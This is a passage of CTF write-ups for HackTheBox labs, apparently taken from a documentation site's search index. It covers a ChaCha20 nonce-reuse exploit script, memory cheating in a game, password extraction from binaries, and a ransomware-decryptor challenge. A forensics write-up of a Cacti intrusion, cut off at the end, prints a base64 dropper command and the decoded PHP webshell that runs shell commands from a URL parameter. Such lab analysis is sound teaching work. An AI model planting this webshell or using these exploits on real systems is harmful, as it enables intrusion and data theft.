return bytes(x ^ y for x, y in zip(a, b))\n\ndef attack_chacha20_nonce_reuse():\n    \"\"\"\n    Exploit ChaCha20 nonce reuse vulnerability\n\n    The vulnerability:\n    - Same key+nonce used for encrypting both message and flag\n    - This means same keystream is generated for both\n\n    Attack:\n    - C1 = M1 \u2295 keystream (encrypted_message)\n    - C2 = M2 \u2295 keystream (encrypted_flag)\n    - C1 \u2295 C2 = M1 \u2295 M2\n    - Therefore: M2 = M1 \u2295 C1 \u2295 C2\n    \"\"\"\n\n    print(\"=== ChaCha20 Nonce Reuse Attack ===\")\n\n    # Known plaintext message\n    known_message = b\"Our counter agencies have intercepted your messages and a lot \"\n    known_message += b\"of your agent's identities have been exposed. In a matter of \"\n    known_message += b\"days all of them will be captured\"\n\n    print(f\"Known message length: {len(known_message)} bytes\")\n    print(f\"Known message: {known_message}\")\n\n    try:\n        # Read the output file\n        with open(\"out.txt\", \"r\") as f:\n            lines = f.read().strip().split('\\n')\n\n        if len(lines) != 3:\n            print(f\"Error: Expected 3 lines in out.txt, got {len(lines)}\")\n            return\n\n        iv_hex = lines[0]\n        encrypted_message_hex = lines[1]\n        encrypted_flag_hex = lines[2]\n\n        print(f\"\\nIV: {iv_hex}\")\n        print(f\"Encrypted message: {encrypted_message_hex}\")\n        print(f\"Encrypted flag: {encrypted_flag_hex}\")\n\n        # Convert from hex to bytes\n        iv = bytes.fromhex(iv_hex)\n        encrypted_message = bytes.fromhex(encrypted_message_hex)\n        encrypted_flag = bytes.fromhex(encrypted_flag_hex)\n\n        print(f\"\\nEncrypted message length: {len(encrypted_message)} bytes\")\n        print(f\"Encrypted flag length: {len(encrypted_flag)} bytes\")\n        print(f\"Known message length: {len(known_message)} bytes\")\n\n        # Verify message length matches\n        if len(encrypted_message) != len(known_message):\n            print(f\"Warning: Length mismatch! encrypted_message={len(encrypted_message)}, known_message={len(known_message)}\")\n\n        # Method 1: Direct keystream recovery\n        print(f\"\\n=== Method 1: Keystream Recovery ===\")\n\n        # Extract keystream from known message\n        min_len = min(len(encrypted_message), len(known_message))\n        keystream = xor_bytes(encrypted_message[:min_len], known_message[:min_len])\n\n        print(f\"Extracted keystream length: {len(keystream)} bytes\")\n        print(f\"Keystream (first 32 bytes): {keystream[:32].hex()}\")\n\n        # Decrypt the flag using the keystream\n        if len(encrypted_flag) &lt;= len(keystream):\n            decrypted_flag = xor_bytes(encrypted_flag, keystream[:len(encrypted_flag)])\n            print(f\"\\nDECRYPTED FLAG: {decrypted_flag}\")\n\n            # Try to decode as text\n            try:\n                flag_text = decrypted_flag.decode('utf-8')\n                print(f\"FLAG (UTF-8): {flag_text}\")\n            except UnicodeDecodeError:\n                print(\"Flag contains non-UTF-8 bytes\")\n        else:\n            print(f\"Error: Flag is longer than available keystream ({len(encrypted_flag)} &gt; {len(keystream)})\")\n\n        # Method 2: Direct XOR approach\n        print(f\"\\n=== Method 2: Direct XOR ===\")\n\n        # XOR the two ciphertexts to get M1 \u2295 M2\n        min_len = min(len(encrypted_message), len(encrypted_flag))\n        xor_result = xor_bytes(encrypted_message[:min_len], encrypted_flag[:min_len])\n\n        # XOR with known message to get flag\n        flag_len = min(len(xor_result), len(known_message))\n        flag_candidate = xor_bytes(xor_result[:flag_len], known_message[:flag_len])\n\n        print(f\"Flag candidate (Method 2): {flag_candidate}\")\n\n        try:\n            flag_text2 = flag_candidate.decode('utf-8')\n            print(f\"FLAG (Method 2): {flag_text2}\")\n        except UnicodeDecodeError:\n            print(\"Flag candidate contains non-UTF-8 bytes\")\n\n        # If flag is longer than the message, try partial recovery\n        if len(encrypted_flag) &gt; len(known_message):\n            print(f\"\\n=== Partial Flag Recovery ===\")\n            print(f\"Flag is {len(encrypted_flag)} bytes, message is {len(known_message)} bytes\")\n            print(f\"Can decrypt first {len(known_message)} bytes of flag\")\n\n            partial_flag = xor_bytes(encrypted_flag[:len(known_message)], keystream[:len(known_message)])\n            print(f\"Partial flag: {partial_flag}\")\n\n            try:\n                partial_text = partial_flag.decode('utf-8')\n                print(f\"PARTIAL FLAG: {partial_text}\")\n            except UnicodeDecodeError:\n                print(\"Partial flag contains non-UTF-8 bytes\")\n\n    except FileNotFoundError:\n        print(\"Error: out.txt file not found!\")\n        print(\"Make sure you have the output file from the ChaCha20 encryption\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\ndef main():\n    attack_chacha20_nonce_reuse()\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"HackTheBox/crypto/TheLastDance/description/#attack-process","title":"Attack Process","text":""},{"location":"HackTheBox/crypto/TheLastDance/description/#step-1-parse-the-output","title":"Step 1: Parse the Output","text":"<p>The <code>out.txt</code> file contains three lines: 1. IV (nonce): <code>c4a66edfe80227b4fa24d431</code> 2. Encrypted message: Known plaintext encrypted 3. Encrypted flag: Target to decrypt</p>"},{"location":"HackTheBox/crypto/TheLastDance/description/#step-2-keystream-extraction","title":"Step 2: Keystream Extraction","text":"<p>Using the known plaintext message: <pre><code>keystream = encrypted_message \u2295 known_message\n</code></pre></p>"},{"location":"HackTheBox/crypto/TheLastDance/description/#step-3-flag-decryption","title":"Step 3: Flag Decryption","text":"<p>Apply the extracted keystream to the encrypted flag: <pre><code>flag = encrypted_flag \u2295 keystream\n</code></pre></p>"},{"location":"HackTheBox/crypto/TheLastDance/description/#step-4-verification","title":"Step 4: Verification","text":"<p>Use the direct XOR method as verification: <pre><code>flag = known_message \u2295 encrypted_message \u2295 encrypted_flag\n</code></pre></p>"},{"location":"HackTheBox/crypto/TheLastDance/description/#key-insights","title":"Key Insights","text":""},{"location":"HackTheBox/crypto/TheLastDance/description/#why-this-attack-works","title":"Why This Attack Works","text":"<ol> <li>Deterministic keystream: ChaCha20 with same key+nonce always produces identical keystream</li> <li>Known plaintext: We have the exact message that was encrypted</li> <li>Stream cipher property: XOR operations are reversible when keystream is known</li> </ol>"},{"location":"HackTheBox/crypto/TheLastDance/description/#critical-mistake-in-code","title":"Critical Mistake in Code","text":"<p>The bug is in the <code>encryptMessage</code> function: <pre><code>def encryptMessage(message, key, nonce):\n    cipher = ChaCha20.new(key=key, nonce=iv)  # Should use 'nonce' parameter\n</code></pre></p> <p>The function parameter is <code>nonce</code> but uses global <code>iv</code>, causing both encryptions to use the same nonce.</p> <p>Vulnerability Type: Nonce Reuse in Stream Cipher Cipher Affected: ChaCha20 Attack Method: Known Plaintext + Keystream Recovery Key Technique: XOR Properties of Stream Ciphers  </p>"},{"location":"HackTheBox/pwn/CubeMadness1/description/","title":"Game Pwning CTF Challenge: CubeMadness1","text":""},{"location":"HackTheBox/pwn/CubeMadness1/description/#challenge-description","title":"Challenge Description","text":"<p>Gotta collect them all.</p> <p>We are provided with a game in this challenge.</p>"},{"location":"HackTheBox/pwn/CubeMadness1/description/#analysis","title":"Analysis","text":""},{"location":"HackTheBox/pwn/CubeMadness1/description/#initial-game-exploration","title":"Initial Game Exploration","text":"<p>Let's run it and see what we need to do.</p> <p>It is a simple Unity game where we need to collect 20 points. However, on the map there are only 6 cubes.</p> <p>This means we will have to use Cheat Engine in order to manipulate the memory and modify the cube values.</p>"},{"location":"HackTheBox/pwn/CubeMadness1/description/#exploitation","title":"Exploitation","text":""},{"location":"HackTheBox/pwn/CubeMadness1/description/#step-1-initial-memory-scan","title":"Step 1: Initial Memory Scan","text":"<p>Let's get one cube in the game.</p> <p>We will go into Cheat Engine, select our game process and scan for value <code>1</code>.</p> <p></p>"},{"location":"HackTheBox/pwn/CubeMadness1/description/#step-2-narrow-down-memory-addresses","title":"Step 2: Narrow Down Memory Addresses","text":"<p>Then we will get another cube in the game.</p> <p>We will go into Cheat Engine and select the value <code>2</code>.</p> <p></p>"},{"location":"HackTheBox/pwn/CubeMadness1/description/#step-3-iterative-filtering","title":"Step 3: Iterative Filtering","text":"<p>We will repeat this until we only have a couple of values and modify their values like in the next picture:</p> <p></p>"},{"location":"HackTheBox/pwn/CubeMadness1/description/#step-4-flag-retrieval","title":"Step 4: Flag Retrieval","text":"<p>We see that now we have 20 cubes and the flag is revealed:</p> <p></p>"},{"location":"HackTheBox/pwn/CubeMadness1/description/#solution-summary","title":"Solution Summary","text":""},{"location":"HackTheBox/pwn/CubeMadness1/description/#memory-manipulation-process","title":"Memory Manipulation Process","text":"<ol> <li>Collect cubes naturally to establish baseline values</li> <li>Use Cheat Engine to scan for current cube count</li> <li>Filter memory addresses by collecting more cubes and scanning for new values</li> <li>Narrow down to the correct memory address storing the cube count</li> <li>Modify the value to 20 to meet the win condition</li> <li>Retrieve the flag displayed in-game</li> </ol>"},{"location":"HackTheBox/pwn/CubeMadness1/description/#tools-used","title":"Tools Used","text":"<ul> <li>Cheat Engine: Memory scanning and modification tool</li> <li>Unity Game: Target application for memory manipulation</li> </ul>"},{"location":"HackTheBox/pwn/CubeMadness1/description/#key-technique","title":"Key Technique","text":"<p>Memory Address Filtering: Progressive scanning technique where you: - Scan for initial value - Change the value in-game - Filter previous results for new value - Repeat until you isolate the correct memory address</p> <p>Challenge Type: Game Pwning / Memory Manipulation Tool Used: Cheat Engine Technique: Memory Address Filtering and Value Modification Target: Unity Game Engine</p>"},{"location":"HackTheBox/reversing/BehindTheScenes/description/","title":"Reversing CTF Challenge: SpookyPass (Behind the Scenes)","text":""},{"location":"HackTheBox/reversing/BehindTheScenes/description/#challenge-description","title":"Challenge Description","text":"<p>After struggling to secure our secret strings for a long time, we finally figured out the solution to our problem: Make decompilation harder. It should now be impossible to figure out how our programs work!</p> <p>In this challenge we are provided with another binary file.</p>"},{"location":"HackTheBox/reversing/BehindTheScenes/description/#analysis","title":"Analysis","text":""},{"location":"HackTheBox/reversing/BehindTheScenes/description/#initial-file-inspection","title":"Initial File Inspection","text":"<p>Let's first figure out what type of file it is by typing: <pre><code>file behindthescenes\n</code></pre></p> <p>Result: <pre><code>behindthescenes: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e60ae4c886619b869178148afd12d0a5428bfe18, for GNU/Linux 3.2.0, not stripped\n</code></pre></p>"},{"location":"HackTheBox/reversing/BehindTheScenes/description/#running-the-executable","title":"Running the Executable","text":"<p>Another executable, let's try running it to figure out what we should do.</p> <p>Result:</p> <p></p> <p>We are prompted with instructions to send the password as args when running the binary.</p>"},{"location":"HackTheBox/reversing/BehindTheScenes/description/#assembly-analysis","title":"Assembly Analysis","text":"<p>Let's dump the object and check the ASM instructions:</p> <p></p> <p>As we can see from the assembly code: <pre><code>131e:       e8 cd fd ff ff          call   10f0 &lt;strlen@plt&gt;\n1323:       48 83 f8 0c             cmp    $0xc,%rax\n1327:       0f 85 05 01 00 00       jne    1432 &lt;main+0x1d1&gt;\n132d:       0f 0b                   ud2\n</code></pre></p> <p>The program checks firstly if the password provided has the length 12. This is a good clue - the password should have 12 characters.</p>"},{"location":"HackTheBox/reversing/BehindTheScenes/description/#anti-debugging-measures","title":"Anti-Debugging Measures","text":"<p>It seems like the password is stored in the file, but we can't debug the program because of <code>sigaction</code> and <code>ud2</code> instructions which prevent debugging.</p>"},{"location":"HackTheBox/reversing/BehindTheScenes/description/#extracting-the-password","title":"Extracting the Password","text":"<p>Let's read the <code>.rodata</code> section: <pre><code>readelf -x .rodata behindthescenes\n</code></pre></p> <p>Result:</p> <p></p> <p>As we can see, we found a password! If we arrange the characters correctly, we get: <code>Itz_0nLy_UD2</code> which confirms it is correct (12 characters as expected).</p>"},{"location":"HackTheBox/reversing/BehindTheScenes/description/#solution","title":"Solution","text":"<p>We call the program with the discovered password: <pre><code>./behindthescenes Itz_0nLy_UD2\n</code></pre></p> <p>And we should get the flag.</p> <p>Key Takeaways: - The binary uses anti-debugging techniques (<code>ud2</code> instruction, <code>sigaction</code>) - Password length validation (12 characters) - Password stored in scrambled form in <code>.rodata</code> section - Required to pass password as command line argument</p>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/","title":"Reversing CTF Challenge: Simple Encryptor","text":""},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#challenge-description","title":"Challenge Description","text":"<p>On our regular checkups of our secret flag storage server we found out that we were hit by ransomware! The original flag data is nowhere to be found, but luckily we not only have the encrypted file but also the encryption program itself.</p> <p>In this challenge we are provided with a binary and a <code>flag.enc</code> encrypted file.</p>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#analysis","title":"Analysis","text":""},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#initial-binary-inspection","title":"Initial Binary Inspection","text":"<p>First of all, let's see what kind of file is the binary by executing: <pre><code>file encrypt\n</code></pre></p> <p>Result: <pre><code>encrypt: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0bddc0a794eca6f6e2e9dac0b6190b62f07c4c75, for GNU/Linux 3.2.0, not stripped\n</code></pre></p>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#initial-investigation","title":"Initial Investigation","text":"<p>We tried getting the strings and reading the <code>.rodata</code> section. We managed to find that the program reads the flag from a file and outputs it encrypted in <code>flag.enc</code>, but nothing more.</p>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#ghidra-decompilation","title":"Ghidra Decompilation","text":"<p>We will go into Ghidra and decompile the binary into C code to see what we are dealing with.</p> <p>The decompiled program:</p> <p></p>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#code-analysis","title":"Code Analysis","text":"<p>Let's analyze what happens line by line:</p>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#file-reading-section","title":"File Reading Section","text":"<pre><code>local_30 = fopen(\"flag\",\"rb\");\nfseek(local_30,0,2);\nlocal_28 = ftell(local_30);\nfseek(local_30,0,0);\n</code></pre> <ul> <li><code>local_30</code>: Stores the pointer to the file</li> <li>The pointer is moved to the last element with <code>fseek</code></li> <li><code>local_28</code>: Gets the file size using <code>ftell</code></li> <li><code>fseek</code> puts the pointer right back to the first position</li> </ul>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#memory-allocation","title":"Memory Allocation","text":"<pre><code>local_20 = malloc(local_28);\nfread(local_20,local_28,1,local_30);\nfclose(local_30);\n</code></pre> <p>Memory is allocated and file content is read into <code>local_20</code>.</p>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#random-seed-initialization","title":"Random Seed Initialization","text":"<pre><code>tVar2 = time((time_t *)0x0);\nlocal_40 = (uint)tVar2;\nsrand(local_40);\n</code></pre> <ul> <li><code>tVar2</code>: Gets the current time in seconds from Unix epoch</li> <li><code>local_40</code>: Casts it to <code>uint</code></li> <li>Random number generator is seeded with <code>local_40</code></li> </ul>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#encryption-algorithm","title":"Encryption Algorithm","text":"<pre><code>for (local_38 = 0; local_38 &lt; (long)local_28; local_38 = local_38 + 1) {\n    iVar1 = rand();\n    *(byte *)((long)local_20 + local_38) = *(byte *)((long)local_20 + local_38) ^ (byte)iVar1;\n    local_3c = rand();\n    local_3c = local_3c &amp; 7;\n    *(byte *)((long)local_20 + local_38) =\n         *(byte *)((long)local_20 + local_38) &lt;&lt; (sbyte)local_3c |\n         *(byte *)((long)local_20 + local_38) &gt;&gt; 8 - (sbyte)local_3c;\n}\n</code></pre> <p>Here the encryption is happening: 1. XOR Operation: A random number is generated and the current byte is XORed with the random value 2. Bit Rotation: Another random number is generated and masked to 0-7 for bit rotation 3. Left Rotation: The byte is rotated left by that many positions</p>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#file-output","title":"File Output","text":"<pre><code>local_18 = fopen(\"flag.enc\",\"wb\");\nfwrite(&amp;local_40,1,4,local_18);\nfwrite(local_20,1,local_28,local_18);\nfclose(local_18);\n</code></pre> <ul> <li>A new file is opened (<code>flag.enc</code>)</li> <li>CRITICAL: The seed is written as the first 4 bytes</li> <li>The encrypted flag is written after that</li> <li>The file is closed</li> </ul>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#exploitation","title":"Exploitation","text":""},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#key-insight","title":"Key Insight","text":"<p>The critical vulnerability is that the random seed used for encryption is stored as the first 4 bytes of the encrypted file!</p>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#decryption-strategy","title":"Decryption Strategy","text":"<ol> <li>Extract the seed from the first 4 bytes of <code>flag.enc</code></li> <li>Use the same seed to generate the identical random sequence</li> <li>Reverse the encryption operations in the opposite order</li> </ol>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#reading-the-seed","title":"Reading the Seed","text":"<pre><code>// Read entire file\nunsigned char* data = malloc(file_size);\nfread(data, 1, file_size, f);\nfclose(f);\n\n// Extract seed from first 4 bytes\nunsigned int seed = *(unsigned int*)data;\n</code></pre>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#reverse-encryption-function","title":"Reverse Encryption Function","text":"<pre><code>void reverse_obfuscation(unsigned char* data, int length, unsigned int seed) {\n    srand(seed);\n\n    for (int i = 0; i &lt; length; i++) {\n        // Generate same random sequence\n        int iVar1 = rand();\n        int local_3c = rand();\n        local_3c = local_3c &amp; 7;\n\n        // Reverse rotation (right rotate instead of left)\n        data[i] = (data[i] &gt;&gt; local_3c) | (data[i] &lt;&lt; (8 - local_3c));\n\n        // Reverse XOR (XOR is its own inverse)\n        data[i] = data[i] ^ (unsigned char)iVar1;\n    }\n}\n</code></pre>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#decryption-process","title":"Decryption Process","text":"<ol> <li>Right rotation instead of left rotation to reverse the bit shift</li> <li>XOR with the same random value (since XOR is its own inverse)</li> <li>Use identical random sequence by seeding with the extracted seed</li> </ol>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#solution-summary","title":"Solution Summary","text":"<p>The ransomware made a critical mistake by storing the encryption seed in the encrypted file itself. This allows us to:</p> <ol> <li>Extract the seed from the first 4 bytes of <code>flag.enc</code></li> <li>Reproduce the exact random sequence used during encryption</li> <li>Reverse the operations (rotation and XOR) to recover the original flag</li> </ol> <p>The full exploit can be found in the repository.</p>"},{"location":"HackTheBox/reversing/SimpleEncryptor/description/#c-exploit","title":"C Exploit","text":"<p>Here\u2019s the C exploit for the challenge:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ctype.h&gt;\n\nvoid reverse_obfuscation(unsigned char *data, int length, unsigned int seed)\n{\n    srand(seed);\n\n    for (int i = 0; i &lt; length; i++)\n    {\n        int iVar1 = rand();\n        int local_3c = rand();\n        local_3c = local_3c &amp; 7;\n\n        data[i] = (data[i] &gt;&gt; local_3c) | (data[i] &lt;&lt; (8 - local_3c));\n\n        data[i] = data[i] ^ (unsigned char)iVar1;\n    }\n}\n\nint main()\n{\n    FILE *f = fopen(\"flag.enc\", \"rb\");\n    if (!f)\n    {\n        printf(\"Cannot open file.enc\\n\");\n        return 1;\n    }\n\n    fseek(f, 0, SEEK_END);\n    long file_size = ftell(f);\n    fseek(f, 0, SEEK_SET);\n\n    unsigned char *data = malloc(file_size);\n    fread(data, 1, file_size, f);\n    fclose(f);\n\n    unsigned int seed = *(unsigned int *)data; // automatically gets the first 4 bytes while casting to unsigned int because unsigned int takes 4 bytes\n    printf(\"Seed: %u (0x%08X)\\n\", seed, seed);\n\n    int flag_length = file_size - 4;\n    reverse_obfuscation(data + 4, flag_length, seed);\n\n    printf(\"Flag: \");\n    for (int i = 0; i &lt; flag_length; i++)\n    {\n        printf(\"%c\", data[4 + i]);\n    }\n    printf(\"\\n\");\n\n    free(data);\n    return 0;\n}\n</code></pre> <p>Vulnerability Type: Predictable Random Number Generator + Seed Exposure Key Technique: Deterministic PRNG Reversal Critical Flaw: Seed stored in encrypted output Tools Used: Ghidra, GDB</p>"},{"location":"HackTheBox/reversing/SpookyPass/description/","title":"Reversing CTF Challenge: SpookyPass","text":""},{"location":"HackTheBox/reversing/SpookyPass/description/#challenge-description","title":"Challenge Description","text":"<p>All the coolest ghosts in town are going to a Haunted Houseparty - can you prove you deserve to get in?</p> <p>In this challenge we are provided with a binary file.</p>"},{"location":"HackTheBox/reversing/SpookyPass/description/#analysis","title":"Analysis","text":""},{"location":"HackTheBox/reversing/SpookyPass/description/#initial-file-inspection","title":"Initial File Inspection","text":"<p>First thing to do is checking what type of file this is with: <pre><code>file pass\n</code></pre></p> <p>Result: <pre><code>pass: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3008217772cc2426c643d69b80a96c715490dd91, for GNU/Linux 4.4.0, not stripped\n</code></pre></p>"},{"location":"HackTheBox/reversing/SpookyPass/description/#running-the-executable","title":"Running the Executable","text":"<p>Having an executable, let's try to run it:</p> <p></p> <p>As we run the program we are prompted to give the correct password. We have to find the password in the binary file for us to get the flag. The challenge is clear now.</p>"},{"location":"HackTheBox/reversing/SpookyPass/description/#binary-analysis","title":"Binary Analysis","text":"<p>We will start by analyzing the binary:</p> <p></p> <p>As seen in the objdump, the program takes the input from the user (<code>0x1208</code>) and compares it with another string stored in the program (<code>0x1250</code>).</p>"},{"location":"HackTheBox/reversing/SpookyPass/description/#extracting-the-password","title":"Extracting the Password","text":"<p>As we know, the strings are stored in the section called <code>.rodata</code> so let's dump that section: <pre><code>readelf -x .rodata pass\n</code></pre></p> <p>Result:</p> <p></p> <p>We can see the password clearly: <code>s3cr3t_p455_f0r_gh05t5_4nd_gh0ul5</code></p>"},{"location":"HackTheBox/reversing/SpookyPass/description/#solution","title":"Solution","text":"<p>Now, if we run the program and input this password, we will get the flag.</p>"},{"location":"HackTheBox/web/FlagCommand/description/","title":"Web CTF Challenge: Dimensional Escape Quest","text":""},{"location":"HackTheBox/web/FlagCommand/description/#challenge-description","title":"Challenge Description","text":"<p>Embark on the \"Dimensional Escape Quest\" where you wake up in a mysterious forest maze that's not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape!</p> <p>This time we have a web-related CTF challenge.</p>"},{"location":"HackTheBox/web/FlagCommand/description/#analysis","title":"Analysis","text":""},{"location":"HackTheBox/web/FlagCommand/description/#initial-interface","title":"Initial Interface","text":"<p>When we enter the site we have the following interface:</p> <p></p> <p>Just some nonsense writing prompting for a game.</p>"},{"location":"HackTheBox/web/FlagCommand/description/#developer-console-investigation","title":"Developer Console Investigation","text":"<p>Let's check the developer console for clues.</p> <p>We will start by analyzing the requests in the Network tab:</p> <p></p> <p>The <code>options</code> fetch seems interesting, let's analyze the response from it.</p>"},{"location":"HackTheBox/web/FlagCommand/description/#api-response-analysis","title":"API Response Analysis","text":"<p>The response from the GET request is: <pre><code>{\n  \"allPossibleCommands\": {\n    \"1\": [\n      \"HEAD NORTH\",\n      \"HEAD WEST\",\n      \"HEAD EAST\",\n      \"HEAD SOUTH\"\n    ],\n    \"2\": [\n      \"GO DEEPER INTO THE FOREST\",\n      \"FOLLOW A MYSTERIOUS PATH\",\n      \"CLIMB A TREE\",\n      \"TURN BACK\"\n    ],\n    \"3\": [\n      \"EXPLORE A CAVE\",\n      \"CROSS A RICKETY BRIDGE\",\n      \"FOLLOW A GLOWING BUTTERFLY\",\n      \"SET UP CAMP\"\n    ],\n    \"4\": [\n      \"ENTER A MAGICAL PORTAL\",\n      \"SWIM ACROSS A MYSTERIOUS LAKE\",\n      \"FOLLOW A SINGING SQUIRREL\",\n      \"BUILD A RAFT AND SAIL DOWNSTREAM\"\n    ],\n    \"secret\": [\n      \"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack\"\n    ]\n  }\n}\n</code></pre></p>"},{"location":"HackTheBox/web/FlagCommand/description/#key-finding","title":"Key Finding","text":"<p>We see we get a secret option, that has to be the option which gets us the flag!</p>"},{"location":"HackTheBox/web/FlagCommand/description/#solution","title":"Solution","text":"<p>We can now: 1. Type <code>start</code> to start the game 2. Input the secret option: <code>\"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack\"</code> 3. Get the flag</p> <p>Key Takeaways: - Web challenge disguised as a text-based adventure game - Hidden API endpoint reveals secret commands - Network tab analysis revealed the solution - Secret command bypasses the normal game flow</p>"},{"location":"HackTheBox-University2025/","title":"HackTheBox-University 2025","text":"<p>This directory contains writeups for a collection of CTF challenges involving forensics, exploitation, reverse engineering, and web security.</p>"},{"location":"HackTheBox-University2025/#forensics","title":"Forensics","text":"Challenge Description a_trail_of_snow_and_deception Digital forensics investigation santa_giveaway File analysis and extraction"},{"location":"HackTheBox-University2025/#pwn","title":"Pwn","text":"Challenge Description feel_my_terror Binary exploitation challenge shl33t Shellcode injection / Exploitation starshard_core Core dump analysis &amp; exploitation"},{"location":"HackTheBox-University2025/#reverse-engineering","title":"Reverse Engineering","text":"Challenge Description cloudy_core Binary analysis and reversing starshard_reassembly Assembly code reconstruction"},{"location":"HackTheBox-University2025/#web","title":"Web","text":"Challenge Description dead_route Web routing vulnerability <p>Total Challenges: 8 Categories: Forensics, Pwn, Reverse Engineering, Web</p> <p>Back to Main Repository</p>"},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/","title":"Description","text":""},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#a-trail-of-snow-and-deception","title":"A Trail of Snow and Deception","text":"<p>Description: Oliver Mirth, Tinselwick's forensic expert, crouched by the glowing lantern post, tracing the shimmerdust trail with a gloved finger. It led into the snowdrifts, then disappeared, no footprints, no sign of a struggle. He glanced up at the flickering Snowglobe atop Sprucetop Tower, its light wavering like a fading star. \"Someone\u2019s been tampering with the magic,\" Oliver murmured. \"But why?\" He straightened, eyes narrowing. The trail might be gone, but the mystery was just beginning. Can Oliver uncover the secret behind the fading glow?</p>"},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#challenge-overview","title":"Challenge Overview","text":"<p>We are provided with a <code>.pcap</code> file containing network traffic. Our goal is to analyze the capture to uncover details about an attack on a Cacti instance, including versioning, credentials, and malicious payloads.</p>"},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#1-reconnaissance","title":"1. Reconnaissance","text":""},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#what-is-the-cacti-version-in-use","title":"What is the Cacti version in use?","text":"<p>We filtered the HTTP stream to find the initial requests to the Cacti server. In the source code of the login page (or main dashboard), we found the version defined in a JavaScript variable.</p> <p>Evidence:</p> <pre><code>var cactiVersion='1.2.28'; \n</code></pre> <p>Answer: <code>1.2.28</code></p>"},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#what-is-the-set-of-credentials-used-to-log-in","title":"What is the set of credentials used to log in?","text":"<p>We searched for <code>POST</code> requests directed at the login endpoint. Inspecting the body of the login request revealed the username and password parameters.</p> <p>Evidence:</p> <pre><code>__csrf_magic=sid%3A31f2e900cfdebb14d4e31670308d7efb2650f672%2C1764692067&amp;action=login&amp;login_username=marnie.thistlewhip&amp;login_password=Z4ZP_8QzKA\n</code></pre> <p>Answer: <code>marnie.thistlewhip:Z4ZP_8QzKA</code></p>"},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#2-analyzing-the-attack-vector","title":"2. Analyzing the Attack Vector","text":""},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#three-malicious-php-files-are-involved-what-are-they","title":"Three malicious PHP files are involved. What are they?","text":"<p>By following the exploitation flow in the network stream, we observed the attacker interacting with three distinct PHP files. Sorted by their appearance in the stream, they are:</p> <p>Answer: <code>JWUA5a1yj.php,ornF85gfQ.php,f54Avbg4.php</code></p>"},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#what-file-gets-downloaded-during-the-exploitation-process","title":"What file gets downloaded during the exploitation process?","text":"<p>Analyzing the exploit payload, we found a shell command used to create a malicious PHP file. The attacker echoed a base64 encoded string and redirected the decoded output to a file.</p> <p>Exploitation Step:</p> <pre><code>#!/bin/bash\necho PD9waHAgJEE0Z1ZhR3pIID0gImtGOTJzTDBwUXc4ZVR6MTdhQjR4TmM5VlVtM3lIZDZHIjskQTRnVmFSbVYgPSAicFo3cVIxdEx3OERmM1hiSyI7JEE0Z1ZhWHpZID0gYmFzZTY0X2RlY29kZSgkX0dFVFsicSJdKTskYTU0dmFnID0gc2hlbGxfZXhlYygkQTRnVmFYelkpOyRBNGdWYVFkRiA9IG9wZW5zc2xfZW5jcnlwdCgkYTU0dmFnLCJBRVMtMjU2LUNCQyIsJEE0Z1ZhR3pILE9QRU5TU0xfUkFXX0RBVEEsJEE0Z1ZhUm1WKTtlY2hvIGJhc2U2NF9lbmNvZGUoJEE0Z1ZhUWRGKTsgPz4=|base64 --decode &gt; f54Avbg4.php\n</code></pre> <p>Answer: <code>f54Avbg4.php</code></p>"},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#3-payload-analysis-decryption","title":"3. Payload Analysis &amp; Decryption","text":""},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#what-variable-stores-the-result-of-the-executed-system-command","title":"What variable stores the result of the executed system command?","text":"<p>We decoded the base64 content of the dropped file (<code>f54Avbg4.php</code>) to understand its functionality.</p> <p>Decoded PHP Code:</p> <pre><code>&lt;?php \n$A4gVaGzH = \"kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G\"; // Key\n$A4gVaRmV = \"pZ7qR1tLw8Df3XbK\";                 // IV\n$A4gVaXzY = base64_decode($_GET[\"q\"]);\n$a54vag = shell_exec($A4gVaXzY);                 // Execution\n$A4gVaQdF = 